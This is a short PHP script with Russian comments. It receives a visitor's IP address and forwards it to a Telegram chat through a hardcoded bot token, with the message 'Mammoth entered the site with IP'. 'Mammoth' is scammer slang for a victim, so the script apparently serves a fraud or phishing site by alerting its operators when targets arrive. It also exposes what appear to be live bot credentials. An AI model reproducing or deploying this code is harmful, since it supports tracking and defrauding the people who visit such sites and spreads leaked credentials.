<?php
// Настройки Telegram
$token = '7933450477:AAEoNJkflQm9EdTtQpKx9m7R_mYTisBQPvg';
$chatId = '-1002360656275';

// Получаем данные из POST-запроса
$data = json_decode(file_get_contents('php://input'), true);

if (isset($data['ip'])) {
    $ip = $data['ip'];
    $message = "Мамонт зашёл на сайт с IP: $ip";

    // URL для отправки сообщения в Telegram
    $url = "https://api.telegram.org/bot$token/sendMessage";

    // Данные для отправки
    $postData = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    // Инициализация cURL
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData));

    // Выполняем запрос
    $result = curl_exec($ch);

    if ($result === false) {
        http_response_code(500);
        echo json_encode(['error' => 'Failed to send message']);
    } else {
        http_response_code(200);
        echo $result;
    }

    curl_close($ch);
} else {
    http_response_code(400);
    echo json_encode(['error' => 'No IP provided']);
}
?>
